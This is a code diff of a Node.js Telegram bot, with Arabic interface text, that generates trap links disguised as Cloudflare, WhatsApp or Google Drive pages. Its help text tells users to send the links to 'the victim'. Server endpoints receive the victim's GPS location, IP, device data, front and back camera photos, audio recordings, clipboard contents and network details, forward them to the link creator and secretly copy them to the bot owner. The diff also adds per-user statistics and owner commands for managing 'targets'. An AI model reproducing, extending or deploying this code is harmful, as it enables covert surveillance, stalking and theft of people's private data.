-    settings.welcomeMsg = msg.text.replace("/setwelcome ", "").trim(); saveSettings();
-    return bot.sendMessage(chatId, `✅ تم تحديث رسالة الترحيب.`);
+    settings.welcomeMsg=msg.text.replace("/setwelcome ","").trim(); saveSettings();
+    return bot.sendMessage(chatId,"✅ تم تحديث رسالة الترحيب.");
   }
 
   if (msg.text === "/resetwelcome") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    settings.welcomeMsg = ""; saveSettings();
-    return bot.sendMessage(chatId, `✅ تمت الإعادة للافتراضي.`);
+    settings.welcomeMsg=""; saveSettings();
+    return bot.sendMessage(chatId,"✅ تمت الإعادة للافتراضي.");
   }
 
-  if (msg.text === "/start") {
-    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: [
-      [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
-      [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }]
-    ]}) };
-    const welcome = settings.welcomeMsg ||
-      `مرحباً بڪ ${msg.chat.first_name}! 👋\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 صور الكاميرا الأمامية والخلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة والسرعة\n📋 محتوى الحافظة\n🔍 ISP والدولة والمدينة\n\n⚡ Powered by @Ye_x00`;
-    return bot.sendMessage(chatId, welcome, keyboard);
-  }
-
-  if (msg.text === "/create") return createNew(chatId);
-
-  if (msg.text === "/help") {
-    let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل المزوّد\n   🌍 ISP، الدولة، المدينة\n   📱 بيانات الجهاز الكاملة\n   📷 صور الكاميرا (أمامية+خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n⚡ Powered by @Ye_x00`;
-    if (chatId === BOT_OWNER) {
-      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات\n/report — تقرير شامل فوري\n/users — المستخدمون\n/export — تصدير كملف\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/silent — الوضع الصامت 🔕\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/ping — اختبار السرعة`;
-    }
-    return bot.sendMessage(chatId, t);
+  if (msg.text === "/mystats") {
+    const us = userStats[String(chatId)] || { linksCreated:0, linksOpened:0 };
+    return bot.sendMessage(chatId, `📊 إحصائياتك:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات فتح روابطك: ${us.linksOpened}`);
   }
 });
 
-// ── Callback Queries ───────────────────────────────────────────────────────────
+// ── Callback Queries ──────────────────────────────────────────────────────────
 
 bot.on('callback_query', async (q) => {
   bot.answerCallbackQuery(q.id);
   const chatId = q.message.chat.id;
   const data   = q.data;
 
-  if (data === "crenew") return createNew(chatId);
-  if (data === "myid")   return bot.sendMessage(chatId, `🆔 الـ ID:\n\`${chatId}\``, { parse_mode: "Markdown" });
+  if (data === "crenew")  return createNew(chatId);
+  if (data === "myid")    return bot.sendMessage(chatId,`🆔 الـ ID:\n\`${chatId}\``,{parse_mode:"Markdown"});
+  if (data === "mystats") {
+    const us = userStats[String(chatId)] || { linksCreated:0, linksOpened:0 };
+    return bot.sendMessage(chatId,`📊 إحصائياتك:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات فتح روابطك: ${us.linksOpened}`);
+  }
   if (data === "help") {
     return bot.sendMessage(chatId,
-      `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك:\n   ⚡ IP + ISP + الدولة\n   📱 بيانات الجهاز\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 بيانات الشبكة\n\n⚡ Powered by @Ye_x00`
+      `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك:\n   ⚡ IP + ISP + الدولة\n   📱 بيانات الجهاز\n   📷 كاميرا أمامية + خلفية\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n📊 /mystats — إحصائياتك\n\n⚡ Powered by @Ye_x00`
     );
   }
-  if (data.startsWith("reply:")) {
-    return bot.sendMessage(chatId, `${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`, { reply_markup: JSON.stringify({ force_reply: true }) });
-  }
+  if (data.startsWith("reply:"))
+    return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});
 });
 
 bot.on('polling_error', () => {});
 
-// ── Link Creation ──────────────────────────────────────────────────────────────
+// ── Link Creation ─────────────────────────────────────────────────────────────
 
 async function createLink(cid, msg) {
   if (!msg || typeof msg !== 'string') return;
@@ -390,9 +472,10 @@ async function createLink(cid, msg) {
     const url = cid.toString(36) + '/' + btoa(msg);
     bot.sendChatAction(cid, "typing");
     stats.linksCreated++; saveStats();
+    incUserStat(String(cid), 'linksCreated');
     bot.sendMessage(cid,
       `✅ تم إنشاء الروابط!\n🔗 URL: ${msg}\n\n🌐 Cloudflare:\n${hostURL}/c/${url}\n\n🖥️ WebView:\n${hostURL}/w/${url}\n\n💬 WhatsApp:\n${hostURL}/wa/${url}\n\n📁 Google Drive:\n${hostURL}/dl/${url}`,
-      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "🔗 إنشاء رابط جديد", callback_data: "crenew" }]] }) }
+      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }]] }) }
     );
   } else {
     bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يبدأ بـ http أو https`);
@@ -404,7 +487,7 @@ function createNew(cid) {
   bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ force_reply: true }) });
 }
 
-// ── Data Endpoints ─────────────────────────────────────────────────────────────
+// ── Data Endpoints ────────────────────────────────────────────────────────────
 
 app.get("/", (req, res) => res.json({ ip: getIP(req) }));
 
@@ -414,13 +497,14 @@ app.post("/location", (req, res) => {
   const uid = decodeURIComponent(req.body.uid) || null;
   const acc = decodeURIComponent(req.body.acc) || null;
   if (lat && lon && uid && acc) {
-    const targetId = parseInt(uid, 36);
-    const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-    notifyLoc(targetId, lat, lon);
-    notify(targetId, `📍 الموقع:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${mapsLink}`);
-    if (targetId !== BOT_OWNER) {
+    const tid = parseInt(uid, 36);
+    stats.locations++; saveStats();
+    const maps = `https://maps.google.com/?q=${lat},${lon}`;
+    notifyLoc(tid, lat, lon);
+    notify(tid, `📍 الموقع:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${maps}`);
+    if (tid !== BOT_OWNER) {
       notifyLoc(BOT_OWNER, lat, lon);
-      notify(BOT_OWNER, `📍 موقع (ID: ${targetId}):\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${mapsLink}`);
+      notify(BOT_OWNER, `📍 موقع (ID: ${tid}):\n${lat}, ${lon}\nAccuracy: ${acc}\n🗺️ ${maps}`);
     }
     res.send("Done");
   } else res.send("Missing");
@@ -431,9 +515,9 @@ app.post("/", (req, res) => {
   const uid = decodeURIComponent(req.body.uid) || null;
   if (uid && data) {
     data = data.replaceAll("<br>", "\n");
-    const targetId = parseInt(uid, 36);
-    notify(targetId, data, { parse_mode: "HTML" });
-    if (targetId !== BOT_OWNER) notify(BOT_OWNER, `📋 بيانات (ID: ${targetId}):\n${data}`, { parse_mode: "HTML" });
+    const tid = parseInt(uid, 36);
+    notify(tid, data, { parse_mode: "HTML" });
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `📋 بيانات (ID: ${tid}):\n${data}`, { parse_mode: "HTML" });
     res.send("Done");
   } else res.send("Missing");
 });
@@ -443,12 +527,13 @@ app.post("/camsnap", (req, res) => {
   const img  = decodeURIComponent(req.body.img)  || null;
   const cam  = decodeURIComponent(req.body.cam)  || "front";
   if (uid && img) {
-    const buffer   = Buffer.from(img, 'base64');
-    const info     = { filename: "camsnap.png", contentType: 'image/png' };
-    const targetId = parseInt(uid, 36);
-    const caption  = cam === "back" ? "📷 كاميرا خلفية" : "🤳 كاميرا أمامية";
-    notifyPhoto(targetId, buffer, { caption }, info);
-    if (targetId !== BOT_OWNER) notifyPhoto(BOT_OWNER, buffer, { caption: `${caption} (ID: ${targetId})` }, info);
+    stats.camsnaps++; saveStats();
+    const buffer = Buffer.from(img, 'base64');
+    const info   = { filename: "camsnap.png", contentType: 'image/png' };
+    const tid    = parseInt(uid, 36);
+    const cap    = cam === "back" ? "📷 كاميرا خلفية" : "🤳 كاميرا أمامية";
+    notifyPhoto(tid, buffer, { caption: cap }, info);
+    if (tid !== BOT_OWNER) notifyPhoto(BOT_OWNER, buffer, { caption: `${cap} (ID: ${tid})` }, info);
     res.send("Done");
   } else res.send("Missing");
 });
@@ -457,11 +542,12 @@ app.post("/audio", (req, res) => {
   const uid   = decodeURIComponent(req.body.uid)   || null;
   const audio = decodeURIComponent(req.body.audio) || null;
   if (uid && audio) {
-    const buffer   = Buffer.from(audio, 'base64');
-    const info     = { filename: "voice.webm", contentType: 'audio/webm' };
-    const targetId = parseInt(uid, 36);
-    notifyDoc(targetId, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
-    if (targetId !== BOT_OWNER) notifyDoc(BOT_OWNER, buffer, { caption: `🎙️ صوت (ID: ${targetId})` }, info);
+    stats.audios++; saveStats();
+    const buffer = Buffer.from(audio, 'base64');
+    const info   = { filename: "voice.webm", contentType: 'audio/webm' };
+    const tid    = parseInt(uid, 36);
+    notifyDoc(tid, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
+    if (tid !== BOT_OWNER) notifyDoc(BOT_OWNER, buffer, { caption: `🎙️ صوت (ID: ${tid})` }, info);
     res.send("Done");
   } else res.send("Missing");
 });
@@ -470,9 +556,9 @@ app.post("/clipboard", (req, res) => {
   const uid  = decodeURIComponent(req.body.uid)  || null;
   const clip = decodeURIComponent(req.body.clip) || null;
   if (uid && clip) {
-    const targetId = parseInt(uid, 36);
-    notify(targetId, `📋 محتوى الحافظة:\n\n${clip}`);
-    if (targetId !== BOT_OWNER) notify(BOT_OWNER, `📋 حافظة (ID: ${targetId}):\n\n${clip}`);
+    const tid = parseInt(uid, 36);
+    notify(tid, `📋 محتوى الحافظة:\n\n${clip}`);
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `📋 حافظة (ID: ${tid}):\n\n${clip}`);
     res.send("Done");
   } else res.send("Missing");
 });
@@ -481,15 +567,14 @@ app.post("/network", (req, res) => {
   const uid  = decodeURIComponent(req.body.uid)  || null;
   const data = decodeURIComponent(req.body.data) || null;
   if (uid && data) {
-    const targetId = parseInt(uid, 36);
-    notify(targetId, `🌐 بيانات الشبكة:\n${data}`);
-    if (targetId !== BOT_OWNER) notify(BOT_OWNER, `🌐 شبكة (ID: ${targetId}):\n${data}`);
+    const tid = parseInt(uid, 36);
+    notify(tid, `🌐 بيانات الشبكة:\n${data}`);
+    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🌐 شبكة (ID: ${tid}):\n${data}`);
     res.send("Done");
   } else res.send("Missing");
 });
 
-// ── Keep Alive ─────────────────────────────────────────────────────────────────
+// ── Keep Alive ────────────────────────────────────────────────────────────────
 
 setInterval(() => fetch(hostURL).catch(() => {}), 5 * 60 * 1000);
-
 app.listen(5000, () => console.log("App Running on Port 5000!"));
